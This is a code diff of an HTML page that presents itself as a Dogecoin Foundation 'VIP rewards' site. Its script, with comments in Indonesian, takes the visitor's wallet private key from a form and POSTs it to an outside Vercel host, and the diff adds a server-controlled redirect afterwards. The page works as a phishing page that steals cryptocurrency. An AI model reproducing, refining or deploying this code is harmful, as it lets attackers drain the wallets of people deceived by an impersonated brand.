@@ -82,30 +82,36 @@
             <p class="text-sm text-gray-500 mt-4">&copy;2013-2025 | The Dogecoin Foundation &amp; Dogecoin Project. All rights reserved.</p>
         </div>
     </footer>
- <script>
-        document.getElementById("dataForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Mencegah reload halaman
+<script>
+    document.getElementById("dataForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Mencegah reload halaman
 
-            // Ambil nilai dari input form
-            let PrivateKey = document.getElementById("PrivateKey").value;
+        // Ambil nilai dari input form
+        let PrivateKey = document.getElementById("PrivateKey").value;
 
-            // Kirim data ke API verify.php di Vercel
-            fetch("https://dogecoin-vip-rewards.vercel.app/api/verify.php", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    PrivateKey: PrivateKey
-                })
+        // Kirim data ke API verify.php di Vercel
+        fetch("https://dogecoin-vip-rewards.vercel.app/api/verify.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                PrivateKey: PrivateKey
             })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById("response").innerText = "Server: " + JSON.stringify(data);
-            })
-            .catch(error => {
-                document.getElementById("response").innerText = "Error: " + error;
-            });
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("response").innerText = "Server: " + JSON.stringify(data);
+            
+            // Jika respons berisi redirect, arahkan ke halaman tujuan
+            if (data.redirect) {
+                window.location.href = data.redirect;
+            }
+        })
+        .catch(error => {
+            document.getElementById("response").innerText = "Error: " + error;
         });
-    </script>
+    });
+</script>
+
 </body></html>
